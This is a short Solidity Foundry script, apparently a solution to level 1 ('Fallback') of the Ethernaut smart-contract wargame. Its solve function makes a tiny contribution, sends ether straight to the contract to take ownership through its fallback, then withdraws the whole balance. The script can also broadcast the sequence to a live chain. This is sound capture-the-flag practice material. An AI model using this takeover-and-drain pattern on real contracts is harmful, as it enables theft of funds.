pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IFallback {
    function owner() external view returns (address);

    function contribute() external payable;

    function getContribution() external view returns (uint256);

    function withdraw() external;
}

contract Ethernaut01 is EthernautTest {
    function setUp() public {
        initialize(address(0x9CB391dbcD447E645D6Cb55dE6ca23164130D008));
    }

    function run() public {
        vm.startBroadcast();
        deploy();
        solve(me);
        submit(me);
        vm.stopBroadcast();
    }

    function test_01_fallback() public {
        vm.startPrank(me);
        deploy();
        solve(me);
        submit(me);
        vm.stopPrank();
    }

    function solve(address sender) internal {
        IFallback(instance).contribute{value: 1}();
        instance.call{value: 1}("");
        IFallback(instance).withdraw();

        require(instance.balance == 0);
    }
}
